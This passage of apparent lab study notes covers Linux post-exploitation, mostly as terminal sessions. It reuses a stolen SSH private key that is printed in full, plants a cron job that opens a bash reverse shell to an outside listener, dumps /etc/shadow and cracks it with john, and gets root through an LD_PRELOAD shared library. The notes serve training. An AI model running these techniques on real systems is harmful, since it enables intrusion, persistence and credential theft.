- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
- The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.
- Cron jobs can also be run as any user on the system, this is a very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the “root” user.
- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
- In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

### **5-Persistence Via SSH Keys**
- Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.  
- If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
- In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password. 
- After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.
```bash
student@demo:~$ ls -la
total 24
drwxr-xr-x 1 student student 4096 Jun 19 17:27 .
drwxr-xr-x 1 root    root    4096 Apr 26  2019 ..
drwx------ 2 student student 4096 Jun 19 17:27 .cache
drwxr-xr-x 1 root    root    4096 Apr 26  2019 .ssh
student@demo:~$ cd .ssh/
student@demo:~/.ssh$ ls
authorized_keys  id_rsa
student@demo:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDckfXMLVYm4nYoI9/VR0l7V1f5SHhoT1Eqye5CTXbh44HrTX/z5Dq4l6PfyChVhDsNzgg0r0+r1w6z64NB9F2NLX/1LtrRsNU5FHpD8Td3JrREOzMtxqpfouQ+CcFnaBLfsTiZfqSLAS9h6poAbIWrJ+f5A8uiz9mdzcQDgDvUs8WDTVsCakjoZtprtRQb4wJmgzSoM2jkzOvlua0KdU4pDqfRDHvOe7kDanTRN/OYCjt6tnzrElR9dChUXOqYg2qFkoVm2OBXmeT+oeCfUE/J3o2hZ5cAN0gkqLuKriOiZP43L78eXGsCzUgmHG2tITFIxOSqYf/cp5f2JsFZfNjV root@localhost
student@demo:~/.ssh$ cat id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3JH1zC1WJuJ2KCPf1UdJe1dX+Uh4aE9RKsnuQk124eOB601/
8+Q6uJej38goVYQ7Dc4INK9Pq9cOs+uDQfRdjS1/9S7a0bDVORR6Q/E3dya0RDsz
LcaqX6LkPgnBZ2gS37E4mX6kiwEvYeqaAGyFqyfn+QPLos/Znc3EA4A71LPFg01b
AmpI6Gbaa7UUG+MCZoM0qDNo5Mzr5bmtCnVOKQ6n0Qx7znu5A2p00TfzmAo7erZ8
6xJUfXQoVFzqmINqhZKFZtjgV5nk/qHgn1BPyd6NoWeXADdIJKi7iq4jomT+Ny+/
HlxrAs1IJhxtrSExSMTkqmH/3KeX9ibBWXzY1QIDAQABAoIBAEO0liOvgvN6rlRR
9sJMGJVA0WNWyIcUWdDtnTJC/wwFvvqQlocx9oh1G7t0gFUHuuzY4pHxgl44LG40
C91x+kl8vvtu/4JAaqMT0xgJ8kGj4s/S8DnL8r5ajP8yFWj9fFWn27zaL/3vRjEj
R1R7+2f3XvCEJrz6Wk1jPRjqAvOeDRGH3ojsQwWO7k/FcvtqVBCPTGxyUBzXYv06
fM3OY5NL8D7t/bLoHa8dVhqjPnfUR7/IpiAdxEam1X0ObPB5YyBwSlpj6h904bF/
+U697IE23xjVmKMKcvTLe6QAxuRGSMf3/k3rCpDd3UxYF+P2e0CK3MefWjKpAe8r
2xRXyB0CgYEA+7zgmuhJqjik8tbt6b6+ZAJZ68TqLE1f3YEW/LivMeMj5tQZo/w+
0ZJnr6hR3eicMMxWKufGXSEtbs1TzMGvA5SXI9MTu62a5A2h7NDbLuKRwdjh9Qv6
TocFSMTSFcS4jvmbeYlVaSZWrJLLKY6lsjgdjDB4DH7Uc0Anxdr//GsCgYEA4E39
rlB7GWoCX7oXpSEGCHkQkmgX5IDU7+UUySFqD8fWoLsAc47R/TmDsKI+x83PF5jG
oo5P5LmUIeqnAKknTSyfD1YFtMa3tpTE68R9j/uueTK7v5izwWQjicmILm4RdkZJ
TVVH2b0aIQaUnpWWwHLa+BYx2jH4S2GxH89vz78CgYEA211SyApFLw0fR/Hc7kRm
OlYGL7qvaR2fvTDhbCYvnKRXQ61uDoUf5JXUvrBJbrtlZ+yX5dmE9OCVa6mHLbVV
oiQYtIIZ/wCgKbxrbybs6OVMqIQrGtNuMoHcK/Y/L/L19Lk0L2tqPy/GdamRWkxQ
vYXC0cfmxNS8oxWz0uktCrMCgYB6ufF9OMfBxgD6g4WAciss46CvmojIG71mbL8M
tV2kuMC0PN0oXRKELL3jHUKga/lNfefg9WC9UtS8IfmyINtCHJIDABwrJzdJjOiZ
326cIyb5ZUrYsCJaRAI117DNRqgDQL3GtEyV1CPBwin7Avny3mT0rKAmNIUYKaGS
OBuDXQKBgQDIRYOZEaV8rXx3wN24NYuByNUpRM3AIyPIwAuaPklWD6D2KdDveheI
lZtRb6Yzzmeon0DuLPdl7e/R7e5Z8Mx3o40aiJLULlw95JqON3J3W471PZAG1L/g
59PKgUMBNVX9UsUqvHyWlcY/FAT9UhWblgDoN3uXY9Db6q5x7hWzKw==
-----END RSA PRIVATE KEY-----
student@demo:~/.ssh$ exit
logout
Connection to demo.ine.local closed.
# copy the rsa private key and paste it in a file called id_rsa

┌──(root㉿INE)-[~]
└─# nano id_rsa

┌──(root㉿INE)-[~]
└─# ssh -i id_rsa student@demo.ine.local
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
student@demo.ine.local's password:

┌──(root㉿INE)-[~]
└─# chmod 400 id_rsa

┌──(root㉿INE)-[~]
└─# ssh -i id_rsa student@demo.ine.local                                                                                                                                                                                             
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Jun 19 17:30:48 2025 from 192.60.216.2
student@demo:~$ 

```
### **6-Persistence Via Cron Jobs**
- Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule. 
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. 
- We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.
```bash
student@demo:~$ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'" > cron
student@demo:~$ cat cron 
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
student@demo:~$ crontab -i cron
student@demo:~$ crontab -l
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
student@demo:~$ bash -i >& /dev/tcp/192.224.127.2/4444 0>&1
-bash: connect: Connection refused
-bash: /dev/tcp/192.224.127.2/4444: Connection refused
student@demo:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
/bin/bash: connect: Connection refused
/bin/bash: /dev/tcp/192.224.127.2/4444: Connection refused
student@demo:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
/bin/bash: connect: Connection refused
/bin/bash: /dev/tcp/192.224.127.2/4444: Connection refused
student@demo:~$ /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
student@demo:~$ crontab -l
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.224.127.2/4444 0>&1'
student@demo:~$ exit
logout
Connection to 192.224.127.3 closed.

┌──(root㉿INE)-[~]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.224.127.2] from (UNKNOWN) [192.224.127.3] 43704
bash: cannot set terminal process group (226): Inappropriate ioctl for device
bash: no job control in this shell                                                 
student@demo:~$                                                                 
```
### **7-Dumping & Cracking Linux Password Hashes**
- Linux has multi-user support and as a result, multiple users can access the system simultaneously. This can be seen as both an advantage and disadvantage from a security perspective, in that, multiple accounts offer multiple access vectors for attackers and therefore increase the overall risk of the server. 
- All of the information for all accounts on Linux is stored in the passwd file located in: /etc/passwd 
- We cannot view the passwords for the users in the passwd file because they are encrypted and the passwd file is readable by any user on the system. 
- All the encrypted passwords for the users are stored in the shadow file. it can be found in the following directory: /etc/shadow 
- The shadow file can only be accessed and read by the root account, this is a very important security feature as it prevents other accounts on the system from accessing the hashed passwords
- The shadow file gives us information in regards to the hashing algorithm that is being used and the password hash, this is very helpful as we are able to determine the type of hashing algorithm that is being used and its strength. We can determine this by looking at the number after the username encapsulated by the dollar symbol ($)

| Value | Hashing Algorithm |
| ----- | ----------------- |
| $1    | MD5               |
| $2    | Blowfish          |
| $5    | SHA-256           |
| $6    | SHA-512           |
After elevating your privileges
```bash
root@ahmed:/home/ahmed# cat /etc/shadow       
root:$6$VhinDVzmbiLkCT6g$uTsJMpPf/WQq1CJajBcd9ULRteCNq/joezX32NX6.MUBU5.TO1olHcCwCQgK8WiDtdJP.ZLlyGW1LUhBAIsaM/:20258:0:99999:7:::
```
the root password hash is SHA-512
decrypting the hash using john
```bash
root@ahmed:/usr/share/wordlists# john --format=sha512crypt hash rockyou.txt 
Created directory: /root/.john
Warning: invalid UTF-8 seen reading rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
root             (root)     
1g 0:00:00:00 DONE 1/3 (2025-06-19 14:37) 14.28g/s 228.5p/s 228.5c/s 228.5C/s root..root4
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
root@ahmed:/usr/share/wordlists# 
```
decrypting the hash using hashcat
```bash
root@ahmed:/usr/share/wordlists# hashcat -a3 -m 1800 hash rockyou.txt 
```
### **8-Shared Library Injection**
#### Shared Library
- In Linux, a shared library (also known as a dynamic library or dynamic shared object, typically with a .so extension) is a file that contains code and data that can be loaded by multiple processes at runtime.
- Shared libraries allow code to be modular, reusable, and reduce memory usage, as multiple processes can use the same shared code.
#### Injection
- Shared library injection involves injecting a custom shared library into a running process to execute arbitrary code or manipulate the process's behavior.
- This technique can be used for various purposes, such as debugging, monitoring, or, in the context of privilege escalation, executing code with higher privileges.

```bash
student@target:~$ sudo -l
Matching Defaults entries for student on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User student may run the following commands on target:
    (root) NOPASSWD: /usr/sbin/apache2
student@target:~$ nano shell.c
bash: nano: command not found
student@target:~$ vim shell.c
student@target:~$ cat shell.c
#include <studio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
        unsetenv("LD_PRELOAD");
        setgid(0);
        setuid(0);
        system("/bin/bash");
}
student@target:~$ gcc -fPIC -o shell.so shell.c -nostartfiles
shell.c: In function '_init':
shell.c:6:2: warning: implicit declaration of function 'setgid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
  setgid(0);
  ^~~~~~
  setenv
shell.c:7:2: warning: implicit declaration of function 'setuid'; did you mean 'setenv'? [-Wimplicit-function-declaration]
  setuid(0);
  ^~~~~~
  setenv
/usr/bin/x86_64-linux-gnu-ld: warning: cannot find entry symbol _start; defaulting to 0000000000000420
student@target:~$ ls
shell.c  shell.so
student@target:~$ sudo LD_PRELOAD=/home/student/shell.so apache2
root@target:~#
```
